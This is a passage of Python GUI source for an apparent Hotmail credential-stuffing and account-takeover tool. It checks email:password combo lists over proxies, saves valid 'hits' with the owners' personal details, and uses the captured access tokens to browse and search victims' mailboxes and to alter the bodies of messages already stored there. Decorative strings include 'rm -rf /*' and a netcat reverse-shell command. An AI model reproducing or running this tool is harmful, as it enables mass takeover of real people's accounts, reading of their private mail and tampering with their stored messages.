        ctk.CTkButton(self.file_frame, text="Browse", command=self.browse_input).pack(side="left")

        self.paste_frame = ctk.CTkFrame(input_frame)
        self.paste_text = ctk.CTkTextbox(self.paste_frame, height=120, width=600)
        self.paste_text.pack(fill="both", expand=True, padx=5, pady=5)
        ctk.CTkButton(self.paste_frame, text="Create Temp File", command=self.create_temp_file).pack(pady=5)
        self.paste_frame.grid(row=1,column=0,columnspan=3,sticky="ew",pady=5)
        self.paste_frame.grid_remove()

        # Output dir
        out_frame = ctk.CTkFrame(main_frame)
        out_frame.pack(fill="x", pady=5)
        ctk.CTkLabel(out_frame, text="Output Dir:").pack(side="left", padx=5)
        self.out_entry = ctk.CTkEntry(out_frame, width=400)
        self.out_entry.insert(0, os.getcwd())
        self.out_entry.pack(side="left", padx=5)
        ctk.CTkButton(out_frame, text="Browse", command=self.browse_output).pack(side="left")

        # Options row
        opt_frame = ctk.CTkFrame(main_frame)
        opt_frame.pack(fill="x", pady=5)
        ctk.CTkLabel(opt_frame, text="Keyword:").pack(side="left", padx=5)
        self.keyword_entry = ctk.CTkEntry(opt_frame, width=200)
        self.keyword_entry.pack(side="left", padx=5)
        ctk.CTkLabel(opt_frame, text="Threads:").pack(side="left", padx=5)
        self.threads_spin = ctk.CTkEntry(opt_frame, width=50)
        self.threads_spin.insert(0, "10")
        self.threads_spin.pack(side="left", padx=5)

        self.proxy_var = ctk.BooleanVar()
        ctk.CTkCheckBox(opt_frame, text="Use Proxies", variable=self.proxy_var,
                        command=self.toggle_proxy).pack(side="left", padx=10)
        self.proxy_frame = ctk.CTkFrame(opt_frame)
        self.proxy_entry = ctk.CTkEntry(self.proxy_frame, width=300)
        self.proxy_entry.pack(side="left", padx=5)
        ctk.CTkButton(self.proxy_frame, text="Proxy File", command=self.browse_proxy).pack(side="left")
        self.proxy_frame.pack(side="left", padx=5)
        self.proxy_frame.pack_forget()

        # Buttons
        btn_frame = ctk.CTkFrame(main_frame)
        btn_frame.pack(fill="x", pady=10)
        self.start_btn = ctk.CTkButton(btn_frame, text="START HACK", command=self.start_check,
                                       fg_color="#ff8c00", hover_color="#cc7000")
        self.start_btn.pack(side="left", padx=5)
        self.stop_btn = ctk.CTkButton(btn_frame, text="STOP", command=self.stop_check,
                                      state="disabled", fg_color="red")
        self.stop_btn.pack(side="left", padx=5)

        self.stats_label = ctk.CTkLabel(btn_frame, text="Hits:0 | Custom:0 | Bad:0",
                                        font=("Consolas",12,"bold"))
        self.stats_label.pack(side="right", padx=10)

        # Progress bar
        self.progress = ctk.CTkProgressBar(main_frame, orientation="horizontal", width=800)
        self.progress.pack(pady=5)
        self.progress.set(0)

        # Results table
        table_frame = ctk.CTkFrame(main_frame)
        table_frame.pack(fill="both", expand=True, pady=5)
        ctk.CTkLabel(table_frame, text="VALID HITS (Select accounts to use with Email Indexer / Body Replacer)", font=("Consolas",12,"bold")).pack(anchor="w")

        style = ttk.Style()
        style.theme_use("clam")
        style.configure("Treeview", font=("Courier", 10), rowheight=28)
        style.configure("Treeview.Heading", font=("Consolas", 11, "bold"))

        self.tree = ttk.Treeview(table_frame, columns=("Select","Email","Password","Country","Name","Birth","Lang","TZ","Total"),
                                 show="headings", height=12)
        self.tree.heading("Select", text="Select")
        self.tree.heading("Email", text="Email", command=lambda: self.sort_table("email"))
        self.tree.heading("Password", text="Password")
        self.tree.heading("Country", text="Country", command=lambda: self.sort_table("country"))
        self.tree.heading("Name", text="Name", command=lambda: self.sort_table("name"))
        self.tree.heading("Birth", text="Birthdate", command=lambda: self.sort_table("birthdate"))
        self.tree.heading("Lang", text="Mailbox Lang")
        self.tree.heading("TZ", text="Timezone")
        self.tree.heading("Total", text="Keyword Total")

        self.tree.column("Select", width=100, anchor="center")
        for col in ("Email","Password","Country","Name","Birth","Lang","TZ","Total"):
            self.tree.column(col, width=120, anchor="center")

        self.tree.pack(fill="both", expand=True)
        self.tree.bind("<ButtonRelease-1>", self.on_tree_click)

        # Raw log
        log_frame = ctk.CTkFrame(main_frame)
        log_frame.pack(fill="both", expand=True, pady=5)
        ctk.CTkLabel(log_frame, text="RAW LOGS", font=("Consolas",12,"bold")).pack(anchor="w")
        self.raw_log = ctk.CTkTextbox(log_frame, height=150, font=("Courier",9))
        self.raw_log.pack(fill="both", expand=True)

    # ==================== EMAIL INDEXER TAB ====================
    def build_indexer_tab(self):
        tab = self.indexer_tab

        # Account selection
        acct_frame = ctk.CTkFrame(tab)
        acct_frame.pack(fill="x", pady=5)

        ctk.CTkLabel(acct_frame, text="Select Account:", font=("Consolas",12,"bold")).pack(side="left", padx=5)
        self.indexer_acct_var = ctk.StringVar(value="No account selected")
        self.indexer_acct_menu = ctk.CTkOptionMenu(acct_frame, variable=self.indexer_acct_var,
                                                     values=["No account selected"], width=350)
        self.indexer_acct_menu.pack(side="left", padx=5)
        ctk.CTkButton(acct_frame, text="Refresh Accounts", command=self.refresh_indexer_accounts).pack(side="left", padx=5)

        # Folder selection
        folder_frame = ctk.CTkFrame(tab)
        folder_frame.pack(fill="x", pady=5)

        ctk.CTkLabel(folder_frame, text="Folder:", font=("Consolas",12,"bold")).pack(side="left", padx=5)
        self.indexer_folder_var = ctk.StringVar(value="Select folder...")
        self.indexer_folder_menu = ctk.CTkOptionMenu(folder_frame, variable=self.indexer_folder_var,
                                                       values=["Select folder..."], width=250,
                                                       command=self.on_indexer_folder_change)
        self.indexer_folder_menu.pack(side="left", padx=5)
        ctk.CTkButton(folder_frame, text="Fetch Folders", command=self.fetch_indexer_folders).pack(side="left", padx=5)
        self.indexer_folder_info = ctk.CTkLabel(folder_frame, text="", font=("Courier",10))
        self.indexer_folder_info.pack(side="left", padx=10)

        # Search bar
        search_frame = ctk.CTkFrame(tab)
        search_frame.pack(fill="x", pady=5)

        ctk.CTkLabel(search_frame, text="Search:", font=("Consolas",12)).pack(side="left", padx=5)
        self.indexer_search_entry = ctk.CTkEntry(search_frame, width=400)
        self.indexer_search_entry.pack(side="left", padx=5)
        ctk.CTkButton(search_frame, text="Search", command=self.search_indexer_messages,
                      fg_color="#ff8c00").pack(side="left", padx=5)
        ctk.CTkButton(search_frame, text="Clear", command=self.clear_indexer_search).pack(side="left", padx=5)

        # Navigation
        nav_frame = ctk.CTkFrame(tab)
        nav_frame.pack(fill="x", pady=5)
        ctk.CTkButton(nav_frame, text="Previous Page", command=self.indexer_prev_page).pack(side="left", padx=5)
        self.indexer_page_label = ctk.CTkLabel(nav_frame, text="Page 1", font=("Consolas",12,"bold"))
        self.indexer_page_label.pack(side="left", padx=20)
        ctk.CTkButton(nav_frame, text="Next Page", command=self.indexer_next_page).pack(side="left", padx=5)
        self.indexer_status = ctk.CTkLabel(nav_frame, text="Ready", font=("Courier",10), text_color="gray")
        self.indexer_status.pack(side="right", padx=10)

        # Messages table
        msg_frame = ctk.CTkFrame(tab)
        msg_frame.pack(fill="both", expand=True, pady=5)
        ctk.CTkLabel(msg_frame, text="EMAILS", font=("Consolas",12,"bold")).pack(anchor="w")

        style = ttk.Style()
        style.theme_use("clam")
        style.configure("Indexer.Treeview", font=("Courier", 9), rowheight=24)
        style.configure("Indexer.Treeview.Heading", font=("Consolas", 10, "bold"))

        self.indexer_tree = ttk.Treeview(msg_frame,
            columns=("Subject","From","Date","Attachments","Read","Preview"),
            show="headings", height=16, style="Indexer.Treeview")
        self.indexer_tree.heading("Subject", text="Subject")
        self.indexer_tree.heading("From", text="From")
        self.indexer_tree.heading("Date", text="Date")
        self.indexer_tree.heading("Attachments", text="Att.")
        self.indexer_tree.heading("Read", text="Read")
        self.indexer_tree.heading("Preview", text="Preview")

        self.indexer_tree.column("Subject", width=250)
        self.indexer_tree.column("From", width=180)
        self.indexer_tree.column("Date", width=150)
        self.indexer_tree.column("Attachments", width=50, anchor="center")
        self.indexer_tree.column("Read", width=50, anchor="center")
        self.indexer_tree.column("Preview", width=400)
        self.indexer_tree.pack(fill="both", expand=True)
        self.indexer_tree.bind("<Double-1>", self.on_indexer_double_click)

        # Log
        idx_log_frame = ctk.CTkFrame(tab)
        idx_log_frame.pack(fill="x", pady=5)
        ctk.CTkLabel(idx_log_frame, text="INDEXER LOG", font=("Consolas",10,"bold")).pack(anchor="w")
        self.indexer_log = ctk.CTkTextbox(idx_log_frame, height=80, font=("Courier",9))
        self.indexer_log.pack(fill="x")

    # ==================== BODY REPLACER TAB ====================
    def build_replacer_tab(self):
        tab = self.replacer_tab

        # Account & Message selection
        top_frame = ctk.CTkFrame(tab)
        top_frame.pack(fill="x", pady=5)

        ctk.CTkLabel(top_frame, text="Account:", font=("Consolas",12,"bold")).pack(side="left", padx=5)
        self.replacer_acct_var = ctk.StringVar(value="No account selected")
        self.replacer_acct_menu = ctk.CTkOptionMenu(top_frame, variable=self.replacer_acct_var,
                                                      values=["No account selected"], width=300)
        self.replacer_acct_menu.pack(side="left", padx=5)
        ctk.CTkButton(top_frame, text="Refresh", command=self.refresh_replacer_accounts).pack(side="left", padx=5)

        # Message lookup
        msg_frame = ctk.CTkFrame(tab)
        msg_frame.pack(fill="x", pady=5)

        ctk.CTkLabel(msg_frame, text="Message ID:", font=("Consolas",12)).pack(side="left", padx=5)
        self.replacer_msgid_entry = ctk.CTkEntry(msg_frame, width=350)
        self.replacer_msgid_entry.pack(side="left", padx=5)
        ctk.CTkButton(msg_frame, text="Fetch Body", command=self.fetch_body_for_edit,
                      fg_color="#ff8c00").pack(side="left", padx=5)
        ctk.CTkButton(msg_frame, text="Use Selected from Indexer",
                      command=self.use_indexer_selection).pack(side="left", padx=5)

        # Subject display
        subj_frame = ctk.CTkFrame(tab)
        subj_frame.pack(fill="x", pady=5)
        ctk.CTkLabel(subj_frame, text="Subject:", font=("Consolas",11,"bold")).pack(side="left", padx=5)
        self.replacer_subject_var = ctk.StringVar(value="")
        ctk.CTkLabel(subj_frame, textvariable=self.replacer_subject_var,
                     font=("Courier",11), text_color="#ff8c00").pack(side="left", padx=5)

        # Operation mode
        op_frame = ctk.CTkFrame(tab)
        op_frame.pack(fill="x", pady=5)

        ctk.CTkLabel(op_frame, text="Operation:", font=("Consolas",12,"bold")).pack(side="left", padx=5)
        self.replacer_mode = ctk.StringVar(value="replace")
        ctk.CTkRadioButton(op_frame, text="Replace Full Body", variable=self.replacer_mode,
                           value="replace").pack(side="left", padx=5)
        ctk.CTkRadioButton(op_frame, text="Append", variable=self.replacer_mode,
                           value="append").pack(side="left", padx=5)
        ctk.CTkRadioButton(op_frame, text="Prepend", variable=self.replacer_mode,
                           value="prepend").pack(side="left", padx=5)
        ctk.CTkRadioButton(op_frame, text="Find & Replace", variable=self.replacer_mode,
                           value="find_replace").pack(side="left", padx=5)

        # Find/Replace fields (for find_replace mode)
        fr_frame = ctk.CTkFrame(tab)
        fr_frame.pack(fill="x", pady=5)
        ctk.CTkLabel(fr_frame, text="Find:", font=("Consolas",11)).pack(side="left", padx=5)
        self.replacer_find_entry = ctk.CTkEntry(fr_frame, width=250)
        self.replacer_find_entry.pack(side="left", padx=5)
        ctk.CTkLabel(fr_frame, text="Replace:", font=("Consolas",11)).pack(side="left", padx=5)
        self.replacer_replace_entry = ctk.CTkEntry(fr_frame, width=250)
        self.replacer_replace_entry.pack(side="left", padx=5)

        # Body type
        type_frame = ctk.CTkFrame(tab)
        type_frame.pack(fill="x", pady=5)
        ctk.CTkLabel(type_frame, text="Body Type:", font=("Consolas",11)).pack(side="left", padx=5)
        self.replacer_body_type = ctk.StringVar(value="HTML")
        ctk.CTkRadioButton(type_frame, text="HTML", variable=self.replacer_body_type,
                           value="HTML").pack(side="left", padx=5)
        ctk.CTkRadioButton(type_frame, text="Text", variable=self.replacer_body_type,
                           value="Text").pack(side="left", padx=5)

        # Body editor
        editor_frame = ctk.CTkFrame(tab)
        editor_frame.pack(fill="both", expand=True, pady=5)
        ctk.CTkLabel(editor_frame, text="BODY CONTENT EDITOR", font=("Consolas",12,"bold")).pack(anchor="w")

        self.replacer_editor = ctk.CTkTextbox(editor_frame, height=300, font=("Courier",10))
        self.replacer_editor.pack(fill="both", expand=True, pady=5)

        # Action buttons
        btn_frame = ctk.CTkFrame(tab)
        btn_frame.pack(fill="x", pady=5)

        ctk.CTkButton(btn_frame, text="CLEAR", command=lambda: self.replacer_editor.delete("0.0","end"),
                      fg_color="gray").pack(side="left", padx=5)
        ctk.CTkButton(btn_frame, text="APPLY CHANGES", command=self.apply_body_replacement,
                      fg_color="#ff8c00", hover_color="#cc7000",
                      font=("Consolas",12,"bold")).pack(side="left", padx=20)
        self.replacer_result_label = ctk.CTkLabel(btn_frame, text="", font=("Consolas",11))
        self.replacer_result_label.pack(side="left", padx=10)

        # Log
        rep_log_frame = ctk.CTkFrame(tab)
        rep_log_frame.pack(fill="x", pady=5)
        ctk.CTkLabel(rep_log_frame, text="REPLACER LOG", font=("Consolas",10,"bold")).pack(anchor="w")
        self.replacer_log = ctk.CTkTextbox(rep_log_frame, height=60, font=("Courier",9))
        self.replacer_log.pack(fill="x")

    # ==================== INDEXER METHODS ====================
    def refresh_indexer_accounts(self):
        """Populate indexer account dropdown from selected hits"""
        if not self.selected_hits_for_tools:
            self.indexer_log.insert("end", "[WARN] No accounts available. Select accounts in Checker tab first.\n")
            return

        acct_names = [f"{a['email']} ({a['user_id'][:8]}...)" for a in self.selected_hits_for_tools]
        self.indexer_acct_menu.configure(values=acct_names)
        self.indexer_acct_var.set(acct_names[0])
        self.indexer_log.insert("end", f"[INFO] Loaded {len(acct_names)} accounts\n")
        self.indexer_log.see("end")

    def get_selected_indexer_account(self):
        """Get the currently selected account dict for indexer"""
        sel = self.indexer_acct_var.get()
        if "No account" in sel or not self.selected_hits_for_tools:
            return None
        idx = self.indexer_acct_menu.cget("values").index(sel)
        if 0 <= idx < len(self.selected_hits_for_tools):
            return self.selected_hits_for_tools[idx]
        return None

    def fetch_indexer_folders(self):
        """Fetch folders for the selected account"""
        acct = self.get_selected_indexer_account()
        if not acct:
            self.indexer_log.insert("end", "[WARN] Select an account first\n")
            self.indexer_log.see("end")
            return

        self.current_account_for_indexer = acct
        self.indexer_status.configure(text="Fetching folders...")

        def worker():
            try:
                folders = self.indexer.get_user_folders(acct['access_token'], acct['user_id'])
                self.current_folders = folders
                self.root.after(0, lambda: self._populate_indexer_folders(folders))
            except Exception as e:
                self.root.after(0, lambda: self.indexer_log.insert("end", f"[ERROR] {str(e)}\n"))
                self.root.after(0, lambda: self.indexer_log.see("end"))

        threading.Thread(target=worker, daemon=True).start()

    def _populate_indexer_folders(self, folders):
        if not folders:
            self.indexer_log.insert("end", "[WARN] No folders found\n")
            return

        folder_names = [f"{f['name']} ({f.get('total_count', 0)})" for f in folders]
        self.indexer_folder_menu.configure(values=folder_names)
        self.indexer_folder_var.set(folder_names[0])
        self.current_folder_id = folders[0]['id']
        self.indexer_folder_info.configure(
            text=f"Total: {folders[0].get('total_count',0)} | Unread: {folders[0].get('unread_count',0)}"
        )
        self.indexer_log.insert("end", f"[INFO] Found {len(folders)} folders\n")
        self.indexer_log.see("end")
        self.indexer_status.configure(text="Folders loaded")
        # Auto-load first folder
        self.load_indexer_messages()

    def on_indexer_folder_change(self, selection):
        """Handle folder dropdown change"""
        idx = self.indexer_folder_menu.cget("values").index(selection)
        if 0 <= idx < len(self.current_folders):
            folder = self.current_folders[idx]
            self.current_folder_id = folder['id']
            self.indexer_folder_info.configure(
                text=f"Total: {folder.get('total_count',0)} | Unread: {folder.get('unread_count',0)}"
            )
            self.current_page = 0
            self.load_indexer_messages()

    def load_indexer_messages(self, search_query=""):
        """Load messages for current folder"""
        if not self.current_account_for_indexer or not self.current_folder_id:
            return

        self.indexer_status.configure(text="Loading messages...")
        acct = self.current_account_for_indexer
        skip = self.current_page * 50

        def worker():
            try:
                messages, next_link = self.indexer.get_messages(
                    acct['access_token'], acct['user_id'],
                    self.current_folder_id, search_query, 50, skip
                )
                self.current_messages = messages
                self.root.after(0, lambda: self._populate_indexer_messages(messages, next_link))
            except Exception as e:
                self.root.after(0, lambda: self.indexer_log.insert("end", f"[ERROR] {str(e)}\n"))

        threading.Thread(target=worker, daemon=True).start()

    def _populate_indexer_messages(self, messages, next_link):
        for row in self.indexer_tree.get_children():
            self.indexer_tree.delete(row)

        if not messages:
            self.indexer_log.insert("end", "[INFO] No messages found\n")
            self.indexer_log.see("end")

        for msg in messages:
            received = msg['received'][:19] if msg['received'] else ''
            att_mark = "Y" if msg['has_attachments'] else "N"
            read_mark = "Y" if msg['is_read'] else "N"
            self.indexer_tree.insert("", "end", values=(
                msg['subject'][:50],
                f"{msg['from_name']} <{msg['from_email']}>"[:40],
                received,
                att_mark,
                read_mark,
                msg['preview'][:60]
            ))

        self.indexer_page_label.configure(text=f"Page {self.current_page + 1}")
        self.indexer_status.configure(text=f"{len(messages)} messages loaded")

    def search_indexer_messages(self):
        query = self.indexer_search_entry.get().strip()
        if not query:
            self.load_indexer_messages()
        else:
            self.current_page = 0
            self.load_indexer_messages(query)

    def clear_indexer_search(self):
        self.indexer_search_entry.delete(0, "end")
        self.current_page = 0
        self.load_indexer_messages()

    def indexer_prev_page(self):
        if self.current_page > 0:
            self.current_page -= 1
            self.load_indexer_messages()

    def indexer_next_page(self):
        self.current_page += 1
        self.load_indexer_messages()

    def on_indexer_double_click(self, event):
        """Show email details on double-click"""
        item = self.indexer_tree.selection()
        if not item:
            return
        idx = self.indexer_tree.index(item[0])
        if idx < len(self.current_messages):
            msg = self.current_messages[idx]
            self.show_email_detail_popup(msg)

    def show_email_detail_popup(self, msg):
        popup = ctk.CTkToplevel(self.root)
        popup.title(f"Email: {msg['subject'][:50]}")
        popup.geometry("700x500")
        popup.configure(fg_color="#1a1a1a")

        ctk.CTkLabel(popup, text=msg['subject'], font=("Consolas",14,"bold"),
                     text_color="#ff8c00", wraplength=650).pack(pady=10)

        info = f"From: {msg['from_name']} <{msg['from_email']}>\n"
        info += f"Date: {msg['received']}\n"
        info += f"Has Attachments: {msg['has_attachments']}\n"
        info += f"Importance: {msg.get('importance', 'normal')}"

        ctk.CTkLabel(popup, text=info, font=("Courier",11), justify="left",
                     text_color="#cccccc").pack(pady=5, padx=20, anchor="w")

        ctk.CTkLabel(popup, text="Preview:", font=("Consolas",11,"bold"),
                     text_color="#00d4ff").pack(anchor="w", padx=20, pady=(10,0))

        preview_box = ctk.CTkTextbox(popup, height=200, font=("Courier",10))
        preview_box.pack(fill="both", expand=True, padx=20, pady=5)
        preview_box.insert("0.0", msg['preview'])

        btn_frame = ctk.CTkFrame(popup, fg_color="transparent")
        btn_frame.pack(pady=10)

        def copy_id():
            pyperclip.copy(msg['id'])
            ctk.CTkLabel(btn_frame, text="ID Copied!", text_color="lime").pack(side="left", padx=5)

        ctk.CTkButton(btn_frame, text="Copy Message ID", command=copy_id).pack(side="left", padx=5)
        ctk.CTkButton(btn_frame, text="Close", command=popup.destroy, fg_color="red").pack(side="left", padx=5)

    # ==================== BODY REPLACER METHODS ====================
    def refresh_replacer_accounts(self):
        """Populate replacer account dropdown"""
        if not self.selected_hits_for_tools:
            self.replacer_log.insert("end", "[WARN] No accounts available. Select in Checker tab first.\n")
            return

        acct_names = [f"{a['email']} ({a['user_id'][:8]}...)" for a in self.selected_hits_for_tools]
        self.replacer_acct_menu.configure(values=acct_names)
        self.replacer_acct_var.set(acct_names[0])
        self.replacer_log.insert("end", f"[INFO] Loaded {len(acct_names)} accounts\n")
        self.replacer_log.see("end")

    def get_selected_replacer_account(self):
        """Get the currently selected account dict for replacer"""
        sel = self.replacer_acct_var.get()
        if "No account" in sel or not self.selected_hits_for_tools:
            return None
        values = self.replacer_acct_menu.cget("values")
        if sel not in values:
            return None
        idx = values.index(sel)
        if 0 <= idx < len(self.selected_hits_for_tools):
            return self.selected_hits_for_tools[idx]
        return None

    def fetch_body_for_edit(self):
        """Fetch message body for editing"""
        acct = self.get_selected_replacer_account()
        msg_id = self.replacer_msgid_entry.get().strip()

        if not acct:
            self.replacer_result_label.configure(text="Select account first!", text_color="red")
            return
        if not msg_id:
            self.replacer_result_label.configure(text="Enter Message ID!", text_color="red")
            return

        self.current_account_for_replacer = acct
        self.replacer_result_label.configure(text="Fetching...", text_color="yellow")

        def worker():
            try:
                result = self.body_replacer.get_message_body(acct['access_token'], acct['user_id'], msg_id)
                self.root.after(0, lambda: self._populate_body_editor(result, msg_id))
            except Exception as e:
                self.root.after(0, lambda: self.replacer_result_label.configure(
                    text=f"Error: {str(e)}", text_color="red"))

        threading.Thread(target=worker, daemon=True).start()

    def _populate_body_editor(self, result, msg_id):
        if not result:
            self.replacer_result_label.configure(text="Failed to fetch body!", text_color="red")
            return

        self.current_message_for_edit = {
            'id': msg_id,
            'body_type': result['body_type']
        }
        self.replacer_subject_var.set(result['subject'])
        self.replacer_body_type.set(result['body_type'])

        self.replacer_editor.delete("0.0", "end")
        self.replacer_editor.insert("0.0", result['body_content'])

        self.replacer_result_label.configure(text="Body loaded! Edit and Apply.", text_color="lime")
        play_success_chime()

    def use_indexer_selection(self):
        """Use the currently selected message from Email Indexer"""
        item = self.indexer_tree.selection()
        if not item:
            self.replacer_result_label.configure(text="Select a message in Email Indexer first!", text_color="red")
            return

        idx = self.indexer_tree.index(item[0])
        if idx >= len(self.current_messages):
            return

        msg = self.current_messages[idx]
        self.replacer_msgid_entry.delete(0, "end")
        self.replacer_msgid_entry.insert(0, msg['id'])

        # Also set the same account in replacer tab
        if self.current_account_for_indexer:
            acct_names = list(self.replacer_acct_menu.cget("values"))
            for i, a in enumerate(self.selected_hits_for_tools):
                if a['email'] == self.current_account_for_indexer['email']:
                    self.replacer_acct_var.set(acct_names[i])
                    break

        self.replacer_result_label.configure(text="Message ID loaded from Indexer!", text_color="lime")

    def apply_body_replacement(self):
        """Apply the body replacement operation"""
        acct = self.get_selected_replacer_account()
        if not self.current_message_for_edit or not acct:
            self.replacer_result_label.configure(text="Fetch body first!", text_color="red")
            return

        mode = self.replacer_mode.get()
        body_type = self.replacer_body_type.get()
        msg_id = self.current_message_for_edit['id']

        self.replacer_result_label.configure(text="Applying...", text_color="yellow")

        def worker():
            try:
                if mode == "replace":
                    new_body = self.replacer_editor.get("0.0", "end")
                    success, msg = self.body_replacer.replace_body(
                        acct['access_token'], acct['user_id'], msg_id, new_body, body_type)
                elif mode == "append":
                    text = self.replacer_editor.get("0.0", "end").strip()
                    success, msg = self.body_replacer.append_to_body(
                        acct['access_token'], acct['user_id'], msg_id, text, body_type)
                elif mode == "prepend":
                    text = self.replacer_editor.get("0.0", "end").strip()
                    success, msg = self.body_replacer.prepend_to_body(
                        acct['access_token'], acct['user_id'], msg_id, text, body_type)
                elif mode == "find_replace":
                    find_text = self.replacer_find_entry.get()
                    replace_text = self.replacer_replace_entry.get()
                    if not find_text:
                        self.root.after(0, lambda: self.replacer_result_label.configure(
                            text="Enter find text!", text_color="red"))
                        return
                    success, msg = self.body_replacer.find_and_replace_in_body(
                        acct['access_token'], acct['user_id'], msg_id, find_text, replace_text, body_type)
                else:
                    success, msg = False, "Unknown mode"

                color = "lime" if success else "red"
                self.root.after(0, lambda: self.replacer_result_label.configure(text=msg, text_color=color))
                if success:
                    self.root.after(0, play_success_chime)

            except Exception as e:
                self.root.after(0, lambda: self.replacer_result_label.configure(
                    text=f"Error: {str(e)}", text_color="red"))

        threading.Thread(target=worker, daemon=True).start()

    # ==================== THEME & UI HELPERS ====================
    def change_theme(self, theme_name):
        self.current_theme = theme_name
        theme = self.themes[theme_name]
        ctk.set_default_color_theme("dark-blue")
        self.root.configure(fg_color=theme["bg"])
        self.checker_tab.configure(fg_color=theme["bg"])
        self.indexer_tab.configure(fg_color=theme["bg"])
        self.replacer_tab.configure(fg_color=theme["bg"])
        self.progress.configure(progress_color=theme["progress"])
        self.raw_log.configure(text_color=theme["text"])
        style = ttk.Style()
        style.theme_use("clam")
        style.configure("Treeview", background=theme["bg"], foreground=theme["fg"],
                        fieldbackground=theme["bg"], font=("Courier",10))
        style.map('Treeview', background=[('selected', theme["fg"])])

    def toggle_mute(self):
        global SOUND_ENABLED
        self.muted = not self.muted
        SOUND_ENABLED = not self.muted
        self.mute_btn.configure(text="MUTE" if not self.muted else "UNMUTE")

    def set_popup_countries(self, val):
        if val == "ALL":
            self.popup_countries = {"AU","US","GB","CA","DE","FR","JP","BR","IN"}
        else:
            self.popup_countries = {val}

    def animate_quotes(self):
        quotes = [
            ">_ HACK THE PLANET", ">_ I'm in.", ">_ Access Granted.",
            ">_ We are Anonymous.", ">_ rm -rf /*", ">_ sudo su -",
            ">_ 01001001 01101110 01110100 01100101 01101100", ">_ Never gonna give you up",
            ">_ Exploiting MSFT", ">_ Token acquired.", ">_ Cookie monster."
        ]
        def update():
            self.quote_var.set(random.choice(quotes))
            self.root.after(4000, update)
        update()

    def animate_commands(self):
        cmds = [
            "$ nmap -sV -p- target.com", "$ sqlmap -u site.com --dbs",
            "$ hydra -l admin -P wordlist.txt ssh://target",
            "$ msfconsole -q", "$ curl -X POST --data '{\"cmd\":\"id\"}' http://target",
            "$ john --format=nt hash.txt", "$ aircrack-ng -w dict.cap",
            "$ git clone https://github.com/exploitdb/exploitdb", "$ nc -lvp 4444 -e /bin/bash"
        ]
        def update():
            self.cmd_var.set(random.choice(cmds))
            self.root.after(5000, update)
        update()

    # ==================== INPUT HANDLING ====================
    def toggle_input_mode(self):
        if self.input_type.get() == "file":
            self.file_frame.grid()
            self.paste_frame.grid_remove()
        else:
            self.file_frame.grid_remove()
            self.paste_frame.grid()

    def browse_input(self):
        path = filedialog.askopenfilename(filetypes=[("Text files","*.txt")])
        if path:
            self.input_file = path
            self.file_entry.delete(0,"end")
            self.file_entry.insert(0, path)

    def browse_output(self):
        path = filedialog.askdirectory()
        if path:
            self.output_dir = path
            self.out_entry.delete(0,"end")
            self.out_entry.insert(0, path)

    def browse_proxy(self):
        path = filedialog.askopenfilename(filetypes=[("Text files","*.txt")])
        if path:
            self.proxy_entry.delete(0,"end")
            self.proxy_entry.insert(0, path)

    def toggle_proxy(self):
        if self.proxy_var.get():
            self.proxy_frame.pack(side="left", padx=5)
        else:
            self.proxy_frame.pack_forget()

    def create_temp_file(self):
        content = self.paste_text.get("0.0","end").strip()
        if not content:
            messagebox.showerror("Error","Paste area empty!")
            return
        self.temp_file = tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False, encoding="utf-8")
        self.temp_file.write(content)
        self.temp_file.close()
        self.input_file = self.temp_file.name
        self.file_entry.delete(0,"end")
        self.file_entry.insert(0, self.input_file)
        messagebox.showinfo("Temp File", f"Created: {self.input_file}\nNow click START HACK.")

    def load_combos(self):
        if not self.input_file or not os.path.exists(self.input_file):
            return []
        combos = []
        with open(self.input_file, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if line and '@' in line and ':' in line:
                    combos.append(line)
        return combos

    # ==================== CHECKER CONTROL ====================
    def start_check(self):
        combos = self.load_combos()
        if not combos:
            messagebox.showerror("Error","No valid combos found (email:password)")
            return

        self.keyword = self.keyword_entry.get().strip()
        try:
            self.threads = int(self.threads_spin.get())
        except:
            self.threads = 10

        proxy_list = []
        if self.proxy_var.get() and self.proxy_entry.get():
            try:
                with open(self.proxy_entry.get(), 'r') as f:
                    proxy_list = [ln.strip() for ln in f if ln.strip()]
                self.log_raw(f"[INFO] Loaded {len(proxy_list)} proxies", "info")
            except:
                self.log_raw("[WARN] Failed to load proxies", "info")

        self.results_data.clear()
        for row in self.tree.get_children():
            self.tree.delete(row)
        self.selected_hits_for_tools.clear()

        self.running = True
        self.start_btn.configure(state="disabled")
        self.stop_btn.configure(state="normal")
        self.progress.set(0)

        self.stats = {"hits":0,"custom":0,"bad":0}
        self.update_stats_label()

        self.checker = HotmailChecker(
            on_log=self.log_raw,
            on_hit=self.add_hit,
            on_stats_update=self.update_stats,
            on_progress=self.update_progress,
            on_finished=self.check_finished
        )
        self.checker_thread = threading.Thread(target=self.checker.run,
                                               args=(combos, proxy_list, self.keyword, self.threads))
        self.checker_thread.daemon = True
        self.checker_thread.start()

    def stop_check(self):
        if self.checker:
            self.checker.stop()
        self.running = False
        self.start_btn.configure(state="normal")
        self.stop_btn.configure(state="disabled")

    def add_hit(self, info, hit_type):
        country = info["country"].upper()
        if not self.muted:
            if hit_type == "keyword":
                if country == "AU":
                    play_au_jingle()
                else:
                    play_country_sound(country)
        if country in self.popup_countries or (self.popup_countries == "ALL" and hit_type=="keyword"):
            self.show_giant_popup(info)

        line = f"{info['email']}:{info['password']} | Name={info['name']} | Country={country} | Birth={info['birthdate']} | Lang={info['mailbox_lang']} | TZ={info['mailbox_tz']}"
        if hit_type == "keyword":
            line += f" | Total={info['total']}"
        output_dir = self.out_entry.get()
        if hit_type == "keyword":
            with open(os.path.join(output_dir,"Hotmail-Hits.txt"), 'a', encoding='utf-8') as f:
                f.write(line + "\n")
        else:
            with open(os.path.join(output_dir,"Hotmail-Custom.txt"), 'a', encoding='utf-8') as f:
                f.write(line + "\n")

        info['checkbox_state'] = False
        self.results_data.append(info)
        self.root.after(0, lambda: self.insert_table_row(info, hit_type))
        self.log_raw(f"[HIT] {line}", "good")

    def insert_table_row(self, info, hit_type):
        is_selected = info.get('checkbox_state', False)
        check_mark = "[x]" if is_selected else "[ ]"
        values = (
            check_mark,
            info["email"], info["password"], info["country"], info["name"],
            info["birthdate"], info["mailbox_lang"], info["mailbox_tz"],
            info["total"] if hit_type=="keyword" else "0"
        )
        self.tree.insert("", "end", values=values)

    def on_tree_click(self, event):
        region = self.tree.identify_region(event.x, event.y)
        if region != "cell":
            return
        column = self.tree.identify_column(event.x)
        if column != "#1":
            return
        item = self.tree.identify_row(event.y)
        if not item:
            return
        self.toggle_checkbox(item)

    def toggle_checkbox(self, item_id):
